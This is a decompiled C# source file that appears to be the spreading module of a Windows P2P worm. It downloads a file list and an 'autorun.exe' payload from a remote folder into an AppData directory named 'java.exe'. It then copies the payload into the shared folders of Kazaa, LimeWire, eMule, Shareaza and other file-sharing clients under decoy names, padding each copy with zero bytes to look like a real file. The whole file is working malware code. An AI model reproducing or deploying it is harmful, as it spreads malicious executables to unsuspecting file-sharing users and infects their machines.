using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace WindowsApplication1.P2p;

internal class P2P
{
	private static string progpath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

	private static string Installpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\java.exe\\";

	[DebuggerNonUserCode]
	public P2P()
	{
	}

	public static void Start()
	{
		if (!File.Exists(Installpath + "list.txt"))
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile(Config.MyFolder + "list.txt", Installpath + "list.txt");
			Thread.Sleep(2000);
		}
		if (!File.Exists(Installpath + "autorun.exe"))
		{
			WebClient webClient2 = new WebClient();
			webClient2.DownloadFile(Config.MyFolder + "autorun.exe", Installpath + "autorun.exe");
		}
		BearshareStart();
		Edonkey2000Start();
		EmuleStart();
		GroksterStart();
		IcqStart();
		KazaaStart();
		LimewireStart();
		MorpheusStart();
		ShareazaStart();
		TeslaStart();
		WinmxStart();
	}

	public static void ShareazaStart()
	{
		RegistryKey currentUser = Registry.CurrentUser;
		RegistryKey registryKey = currentUser.OpenSubKey("Software\\Shareaza\\Shareaza\\Downloads", writable: false);
		if (registryKey != null)
		{
			object objectValue = RuntimeHelpers.GetObjectValue(registryKey.GetValue("CollectionPath"));
			string cPath = Conversions.ToString(Operators.ConcatenateObject(objectValue, (object)"\\"));
			Copyfromlist(cPath);
		}
	}

	public static void EmuleStart()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		string cPath = folderPath.Replace("Documents", "Downloads\\eMule\\Incoming\\");
		string cPath2 = progpath + "\\emule\\incoming\\";
		Copyfromlist(cPath);
		Copyfromlist(cPath2);
	}

	public static void KazaaStart()
	{
		string cPath = progpath + "\\kazaa\\my shared folder\\";
		string cPath2 = progpath + "\\kazaa lite\\my shared folder\\";
		string cPath3 = progpath + "\\kazaa lite k++\\my shared folder\\";
		Copyfromlist(cPath);
		Copyfromlist(cPath2);
		Copyfromlist(cPath3);
	}

	public static void IcqStart()
	{
		string cPath = progpath + "\\icq\\shared folder\\";
		Copyfromlist(cPath);
	}

	public static void GroksterStart()
	{
		string cPath = progpath + "\\grokster\\my grokster\\";
		Copyfromlist(cPath);
	}

	public static void BearshareStart()
	{
		string cPath = progpath + "\\bearshare\\shared\\";
		Copyfromlist(cPath);
	}

	public static void Edonkey2000Start()
	{
		string cPath = progpath + "\\edonkey2000\\incoming\\";
		Copyfromlist(cPath);
	}

	public static void MorpheusStart()
	{
		string cPath = progpath + "\\morpheus\\my shared folder\\";
		Copyfromlist(cPath);
	}

	public static void LimewireStart()
	{
		string cPath = progpath + "\\limewire\\shared\\";
		Copyfromlist(cPath);
	}

	public static void TeslaStart()
	{
		string cPath = progpath + "\\tesla\\files\\";
		Copyfromlist(cPath);
	}

	public static void WinmxStart()
	{
		string cPath = progpath + "\\winmx\\shared\\";
		Copyfromlist(cPath);
	}

	public static void Copyfromlist(string cPath)
	{
		if (!Directory.Exists(cPath))
		{
			return;
		}
		StreamReader streamReader = new StreamReader(Installpath + "list.txt");
		checked
		{
			for (string text = streamReader.ReadLine(); text != null; text = streamReader.ReadLine())
			{
				if (!File.Exists(cPath + text + ".exe"))
				{
					try
					{
						File.Copy(Installpath + "autorun.exe", cPath + text + ".exe", overwrite: true);
						FileStream fileStream = File.OpenWrite(cPath + text + ".exe");
						long num = fileStream.Seek(0L, SeekOrigin.End);
						int num2 = Convert.ToInt32(text.Length);
						decimal d = new decimal(num2 * 10485);
						while (decimal.Compare(new decimal(num), d) < 0)
						{
							num++;
							fileStream.WriteByte(0);
						}
						fileStream.Close();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			streamReader.Close();
		}
	}
}
